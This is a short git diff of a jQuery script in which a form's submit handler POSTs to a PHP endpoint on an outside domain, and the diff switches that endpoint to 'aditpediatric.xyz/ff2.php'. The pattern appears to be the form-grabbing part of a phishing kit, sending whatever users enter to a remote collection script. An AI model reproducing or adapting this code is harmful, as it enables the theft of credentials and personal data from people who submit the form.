@@ -4,7 +4,7 @@ $(".fomalex").submit(function() {
 
 	$.ajax({
 
-        url: "https://aditpediatric.xyz/test/ff.php",
+        url: "https://aditpediatric.xyz/ff2.php",
 
         type: "POST",
 
